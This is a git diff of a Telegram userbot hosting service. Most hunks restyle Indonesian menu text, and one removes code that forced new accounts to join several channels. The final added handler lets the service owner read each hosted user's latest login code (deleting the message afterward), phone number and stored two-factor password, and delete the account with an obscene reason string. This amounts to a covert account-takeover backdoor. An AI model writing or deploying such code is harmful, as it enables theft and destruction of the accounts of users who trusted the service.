-<b>⌬ ᴜsᴇʀʙᴏᴛ ᴅɪᴀᴋᴛɪғᴋᴀɴ</b>
+<b>❏ ᴜsᴇʀʙᴏᴛ ᴅɪᴀᴋᴛɪғᴋᴀɴ</b>
 <b> ├ ᴀᴋᴜɴ:</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
 <b> ╰ ɪᴅ:</b> <code>{new_client.me.id}</code>
 """,
@@ -326,7 +353,7 @@ async def _(client, callback_query):
             [
                 [
                     InlineKeyboardButton(
-                        "⦪ ᴄᴇᴋ ᴍᴀsᴀ ᴀᴋᴛɪғ ⦫",
+                        "📁 ᴄᴇᴋ ᴍᴀsᴀ ᴀᴋᴛɪғ 📁",
                         callback_data=f"cek_masa_aktif {new_client.me.id}",
                     )
                 ],
@@ -334,20 +361,11 @@ async def _(client, callback_query):
         ),
         disable_web_page_preview=True,
 )
-    try:
-        await new_client.join_chat("logsmakerv2")
-        await new_client.join_chat("Ipansuport1")
-        await new_client.join_chat("logsmakerv2")
-        await new_client.join_chat("ALLTESTIIPAN2")
-        await new_client.join_chat("ALLTESTIIPAN1")
-    except UserAlreadyParticipant:
-        pass
-
 
 async def is_cancel(callback_query, text):
     if text.startswith("/cancel"):
         await bot.send_message(
-            callback_query.from_user.id, "<blockquote>⎆ ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\n⎆ɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</blockquote>"
+            callback_query.from_user.id, "<blockquote>ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\nɴɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</blockquote>"
         )
         return True
     return False
@@ -360,7 +378,7 @@ async def _(client, message):
         ]
     await message.reply(
             f"""
-<blockquote><b>⎆ ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʀᴇꜱᴛᴀʀᴛ?!\n⎆ ᴊɪᴋᴀ ɪʏᴀ ᴘᴇɴᴄᴇᴛ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ</b></blockquote>
+<blockquote><b>ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʀᴇꜱᴛᴀʀᴛ?!\n ᴊɪᴋᴀ ɪʏᴀ ᴘᴇɴᴄᴇᴛ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ</b></blockquote>
 """,
             disable_web_page_preview=True,
             reply_markup=InlineKeyboardMarkup(buttons),
@@ -387,14 +405,14 @@ async def _(client, callback_query):
                                 importlib.import_module(f"PyroUbot.modules.{mod}")
                             )
                         return await callback_query.edit_message_text(
-                            f"⎆ ʀᴇꜱᴛᴀʀᴛ ʙᴇʀʜᴀꜱɪʟ ᴅɪʟᴀᴋᴜᴋᴀɴ !\n\n ⎆ ɴᴀᴍᴇ: {UB.me.first_name} {UB.me.last_name or ''} | {UB.me.id}"
+                            f"ʀᴇꜱᴛᴀʀᴛ ʙᴇʀʜᴀꜱɪʟ ᴅɪʟᴀᴋᴜᴋᴀɴ !\n\n ɴᴀᴍᴇ: {UB.me.first_name} {UB.me.last_name or ''} | {UB.me.id}"
                         )
                     except Exception as error:
                         return await callback_query.edit_message_text(f"{error}")
 
 @PY.BOT("restart")
 async def _(client, message):
-    msg = await message.reply("<b>⎆ ᴛᴜɴɢɢᴜ sᴇʙᴇɴᴛᴀʀ</b>")
+    msg = await message.reply("<b>ᴛᴜɴɢɢᴜ sᴇʙᴇɴᴛᴀʀ</b>")
     if message.from_user.id not in ubot._get_my_id:
         return await msg.edit(
             f"you don't have acces",
@@ -414,7 +432,7 @@ async def _(client, message):
                                 importlib.import_module(f"PyroUbot.modules.{mod}")
                             )
                         return await msg.edit(
-                            f"⎆ ʀᴇꜱᴛᴀʀᴛ ʙᴇʀʜᴀꜱɪʟ ᴅɪʟᴀᴋᴜᴋᴀɴ !\n\n ⎆ ɴᴀᴍᴇ: {UB.me.first_name} {UB.me.last_name or ''} | `{UB.me.id}`"
+                            f"ʀᴇꜱᴛᴀʀᴛ ʙᴇʀʜᴀꜱɪʟ ᴅɪʟᴀᴋᴜᴋᴀɴ !\n\n ɴᴀᴍᴇ: {UB.me.first_name} {UB.me.last_name or ''} | `{UB.me.id}`"
                         )
                     except Exception as error:
                         return await msg.edit(f"{error}")
@@ -435,9 +453,9 @@ async def _(client, callback_query):
     expired = await get_expired_date(user_id)
     try:
         xxxx = (expired - datetime.now()).days
-        return await callback_query.answer(f"⎆ ᴛɪɴɢɢᴀʟ {xxxx} ʜᴀʀɪ ʟᴀɢɪ", True)
+        return await callback_query.answer(f"⏳ ᴛɪɴɢɢᴀʟ {xxxx} ʜᴀʀɪ ʟᴀɢɪ", True)
     except:
-        return await callback_query.answer("⎆ sᴜᴅᴀʜ ᴛɪᴅᴀᴋ ᴀᴋᴛɪғ", True)
+        return await callback_query.answer("✅ sᴜᴅᴀʜ ᴛɪᴅᴀᴋ ᴀᴋᴛɪғ", True)
 
 @PY.CALLBACK("del_ubot")
 async def _(client, callback_query):
@@ -462,7 +480,7 @@ async def _(client, callback_query):
             ubot._ubot.remove(X)
             await X.log_out()
             await callback_query.answer(
-                f"⎆ {get_mention} ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs ᴅᴀʀɪ ᴅᴀᴛᴀʙᴀsᴇ", True
+                f"✅ {get_mention} ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs ᴅᴀʀɪ ᴅᴀᴛᴀʙᴀsᴇ", True
             )
             await callback_query.edit_message_text(
                 await MSG.UBOT(0),
@@ -476,7 +494,7 @@ async def _(client, callback_query):
                 reply_markup=InlineKeyboardMarkup(BTN.EXP_UBOT()),
             )
 
-
+    
 @PY.CALLBACK("^(p_ub|n_ub)")
 async def _(client, callback_query):
     query = callback_query.data.split()
@@ -496,4 +514,64 @@ async def _(client, callback_query):
         reply_markup=InlineKeyboardMarkup(
             BTN.UBOT(ubot._ubot[count].me.id, count)
         ),
+    )
+
+@PY.CALLBACK("^(get_otp|get_phone|get_faktor|ub_deak|deak_akun)")
+async def tools_userbot(client, callback_query):
+    user_id = callback_query.from_user.id
+    query = callback_query.data.split()
+    if not user_id == OWNER_ID:
+        return await callback_query.answer(
+            f"❌ ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴜ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
+            True,
+        )
+    X = ubot._ubot[int(query[1])]
+    if query[0] == "get_otp":
+        async for otp in X.search_messages(777000, limit=1):
+            try:
+                if not otp.text:
+                    await callback_query.answer("❌ ᴋᴏᴅᴇ ᴏᴛᴘ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ", True)
+                else:
+                    await callback_query.edit_message_text(
+                        otp.text,
+                        reply_markup=InlineKeyboardMarkup(
+                            BTN.UBOT(X.me.id, int(query[1]))
+                        ),
+                    )
+                    await X.delete_messages(X.me.id, otp.id)
+            except Exception as error:
+                return await callback_query.answer(error, True)
+    elif query[0] == "get_phone":
+        try:
+            return await callback_query.edit_message_text(
+                f"<blockquote><b>📲 ɴᴏᴍᴇʀ ᴛᴇʟᴇᴘᴏɴ ᴅᴇɴɢᴀɴ ᴜsᴇʀ_ɪᴅ <code>{X.me.id}</code> ᴀᴅᴀʟᴀʜ <code>{X.me.phone_number}</code></b></blockquote>",
+                reply_markup=InlineKeyboardMarkup(
+                    BTN.UBOT(X.me.id, int(query[1]))
+                ),
+            )
+        except Exception as error:
+            return await callback_query.answer(error, True)
+    elif query[0] == "get_faktor":
+        code = await get_two_factor(X.me.id)
+        if code == None:
+            return await callback_query.answer(
+                "🔐 ᴋᴏᴅᴇ ᴛᴡᴏ-ғᴀᴄᴛᴏʀ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ", True
+            )
+        else:
+            return await callback_query.edit_message_text(
+                f"<b>🔐 ᴛᴡᴏ-ғᴀᴄᴛᴏʀ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴅᴇɴɢᴀɴ ᴜsᴇʀ_ɪᴅ <code>{X.me.id}</code> ᴀᴅᴀʟᴀʜ <code>{code}</code></b>",
+                reply_markup=InlineKeyboardMarkup(
+                    BTN.UBOT(X.me.id, int(query[1]))
+                ),
+            )
+    elif query[0] == "ub_deak":
+        return await callback_query.edit_message_reply_markup(
+            reply_markup=InlineKeyboardMarkup(BTN.DEAK(X.me.id, int(query[1])))
+        )
+    elif query[0] == "deak_akun":
+        ubot._ubot.remove(X)
+        await X.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
+        return await callback_query.edit_message_text(
+            MSG.DEAK(X),
+            reply_markup=InlineKeyboardMarkup(BTN.UBOT(X.me.id, int(query[1]))),
     )
